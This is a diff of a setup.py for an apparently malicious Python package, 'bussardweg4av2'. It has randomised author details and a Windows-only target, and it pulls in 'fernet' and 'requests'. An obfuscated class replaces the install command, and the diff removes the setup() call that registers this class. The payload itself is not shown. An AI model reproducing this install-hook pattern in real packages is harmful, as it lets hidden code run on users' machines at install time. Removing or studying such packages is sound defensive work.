@@ -18,22 +18,5 @@ class onRiDXXLOlxduIywDvvRWLIHPEjFNZFdZeNrHVbFqbTYvKsOXBmwUBShAvrEpZrHFBHUpGYWwj
             install.run(self)
 
 
-setup(
-    name="bussardweg4av2",
-    version=VERSION,
-    author="ZyoTMRloHZZOJ",
-    author_email="bAFcllsXWWQdYk@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': onRiDXXLOlxduIywDvvRWLIHPEjFNZFdZeNrHVbFqbTYvKsOXBmwUBShAvrEpZrHFBHUpGYWwjdSKBuIUZQojYZftWatXjiPNgaRJqhdkzRqgr,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
